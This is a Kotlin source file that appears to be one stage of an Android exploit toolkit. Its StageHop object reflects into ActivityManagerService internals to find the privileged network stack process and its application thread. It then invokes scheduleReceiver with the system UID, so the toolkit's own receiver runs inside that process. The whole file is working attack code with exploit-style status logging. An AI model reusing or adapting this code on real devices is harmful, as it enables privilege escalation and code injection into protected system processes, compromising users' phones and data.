package com.snothin.ghostsam.companion

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.os.Process
import android.util.Log
import java.lang.reflect.Method

object StageHop {
    private const val TAG = "GhostSamCompanion"

    private const val NS_PROCESS = "com.android.networkstack.process"
    private const val NS_UID = 1073

    private val THREAD_FIELDS = listOf("mOnewayThread", "mThread", "thread")

    private const val SCHEDULE_RECEIVER = "scheduleReceiver"
    private const val SCHEDULE_RECEIVER_ARGS = 12

    fun hop(context: Context, nonce: String): String {
        val out = StringBuilder()
        try {
            val info = receiverInfo(context)
            val intent = Intent().setClassName(context.packageName, info.name)
                .putExtra(StageReceiver.EXTRA_HOP_NONCE, nonce)

            val ams = Class.forName("android.os.ServiceManager")
                .getMethod("getService", String::class.java)
                .invoke(null, Context.ACTIVITY_SERVICE)
                ?: error("AMS handle is null")
            out.line("[*] ams=ok")

            val record = resolveProcessRecord(ams, out)
                ?: error("networkstack ProcessRecord not found")
            val thread = resolveAppThread(record, out) ?: error("IApplicationThread not found")
            val schedule = scheduleReceiverMethod(thread)

            schedule.isAccessible = true
            schedule.invoke(
                thread, intent, info, null, 0, null, null,
                false, false, 0, 0, Process.SYSTEM_UID, "android",
            )
            out.line("[+] scheduleReceiver sent")
        } catch (t: Throwable) {
            out.line("[x] hop failed: ${t.javaClass.simpleName}: ${t.message}")
            Log.w(TAG, "hop failed: ${t.javaClass.simpleName}: ${t.message}")
            return out.toString()
        }
        Log.i(TAG, "hop ok")
        return out.toString()
    }

    private fun receiverInfo(context: Context): ActivityInfo {
        val app = context.packageManager.getApplicationInfo(
            context.packageName,
            PackageManager.ApplicationInfoFlags.of(0),
        )
        return ActivityInfo().apply {
            applicationInfo = app
            name = StageReceiver::class.java.name
        }
    }

    private fun scheduleReceiverMethod(thread: Any): Method =
        thread.javaClass.methods.firstOrNull {
            it.name == SCHEDULE_RECEIVER && it.parameterCount == SCHEDULE_RECEIVER_ARGS
        } ?: error("$SCHEDULE_RECEIVER($SCHEDULE_RECEIVER_ARGS) not found on ${thread.javaClass.name}")

    private fun field(target: Any, name: String): Any? = target.javaClass
        .getDeclaredField(name)
        .apply { isAccessible = true }
        .get(target)

    private fun StringBuilder.line(text: String): StringBuilder = append(text).append('\n')

    private fun firstHit(out: StringBuilder, candidates: List<Pair<String, () -> Any?>>): Any? {
        for ((what, get) in candidates) {
            val probe = runCatching(get)
            val hit = probe.getOrNull()
            if (hit != null) {
                out.line("[+] $what")
                return hit
            }
            val why = probe.exceptionOrNull()?.let { it.message ?: it.javaClass.simpleName }
                ?: "returned null"
            out.line("[!] $what: $why")
        }
        return null
    }

    private fun resolveProcessRecord(ams: Any, out: StringBuilder): Any? {
        val overloads = runCatching {
            ams.javaClass.declaredMethods.filter { it.name == "getProcessRecordLocked" }
        }.getOrDefault(emptyList())
        out.line("[*] getProcessRecordLocked overloads=${overloads.map { it.parameterCount }}")

        val candidates = buildList<Pair<String, () -> Any?>> {
            overloads.firstOrNull { it.parameterCount == 3 }?.let { m ->
                add("getProcessRecordLocked(3)" to { invokeLocked(ams, m, NS_PROCESS, NS_UID, false) })
            }
            overloads.firstOrNull { it.parameterCount == 2 }?.let { m ->
                add("getProcessRecordLocked(2)" to { invokeLocked(ams, m, NS_PROCESS, NS_UID) })
            }
            add("mProcessList.mProcessNames" to { processNamesLookup(ams) })
        }
        return firstHit(out, candidates)
    }

    private fun invokeLocked(ams: Any, method: Method, vararg args: Any?): Any? {
        method.isAccessible = true
        return synchronized(ams) { method.invoke(ams, *args) }
    }

    private fun processNamesLookup(ams: Any): Any? {
        val list = field(ams, "mProcessList") ?: error("mProcessList is null")
        val names = field(list, "mProcessNames") ?: error("mProcessNames is null")
        val get = names.javaClass.getMethod("get", String::class.java, Int::class.javaPrimitiveType)
        return synchronized(names) { get.invoke(names, NS_PROCESS, NS_UID) }
    }

    private fun resolveAppThread(record: Any, out: StringBuilder): Any? {
        val candidates = buildList<Pair<String, () -> Any?>> {
            for (name in THREAD_FIELDS) add("field $name" to { field(record, name) })
            add("getOnewayThread()" to { callNoArg(record, "getOnewayThread") })
        }
        return firstHit(out, candidates)
    }

    private fun callNoArg(target: Any, name: String): Any? = target.javaClass.methods
        .firstOrNull { it.name == name && it.parameterCount == 0 }
        ?.apply { isAccessible = true }
        ?.invoke(target)
}
